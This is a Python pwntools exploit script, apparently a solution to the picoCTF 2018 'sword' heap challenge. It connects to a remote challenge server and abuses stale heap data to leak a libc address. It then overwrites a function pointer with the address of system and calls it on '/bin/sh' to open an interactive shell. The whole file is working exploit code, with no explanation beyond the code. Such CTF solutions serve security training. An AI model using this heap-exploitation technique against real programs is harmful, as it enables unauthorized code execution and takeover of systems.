from pwn import *

GOT_ALARM = 0x602038
BSS_LIST = 0x6020c8
LIBC_OFFSET = 0x3c4998  # leak from .data
SYSTEM_OFFSET = 0x045120 + 0x90


# p = process(['./ld-linux-x86-64.so.2', './sword'],  env={'LD_PRELOAD':'./_libc.so.6'})
p = remote('2018shell1.picoctf.com', 10491)


def wait_prompt(print_=False):
    r = p.readuntil('7. Quit.')
    if print_:
        print(r)


def create():
    wait_prompt()
    p.sendline('1')
    p.readuntil('index is ')
    idx = p.readuntil('.')[:-1]
    return idx


def send_choice(c, until, _print=True):
    p.sendline(c)
    r = p.readuntil(until)
    if _print:
        print(r)

def harden(idx, name, s=None):
    wait_prompt()
    send_choice('5', 'sword?')
    send_choice(idx, 'name?')
    s = s or 150
    send_choice(str(s), 'name.')
    send_choice(name+'\x00', 'sword?')
    p.sendline('-1')

def synthe(idx1, idx2):
    wait_prompt()
    p.sendline('2')
    p.sendline(idx1)
    p.sendline(idx2)

def show(idx, print_=False):
    wait_prompt()
    send_choice('3', 'sword?')
    p.sendline(idx)

def equip(idx):
    wait_prompt()
    send_choice('6', 'sword?')
    p.sendline(idx)

def destroy(idx):
    wait_prompt()
    send_choice('4', 'sword?')
    p.sendline(idx)


GDB = """
b *0x400e32
b *0x400eb4
c
"""
#gdb.attach(p, GDB)

i = create()
info("Sword created: "+i)
j = create()
info("Sword created: "+j)
harden(i, 'XXXXYYYYBBBBAAAAZZZZXXzz')
harden(j, 'Y'*128)
info("Synth %s and %s" % (i, j))
synthe(i, j)
show(i)
p.readuntil('name is ')
a = p.read(6).ljust(8, '\x00')
libc_base = u64(a) - LIBC_OFFSET
libc_system = libc_base + SYSTEM_OFFSET
info('system: '+hex(libc_system))

# clean heap
destroy(j)

info("RESTART")

i = create()
harden(i, 16 * '\x00' + p64(libc_system))
destroy(i)

k = create()
j = create()

harden(k, '/bin/sh', 8)

info(j)
synthe(k, j)

equip(j)

p.interactive()
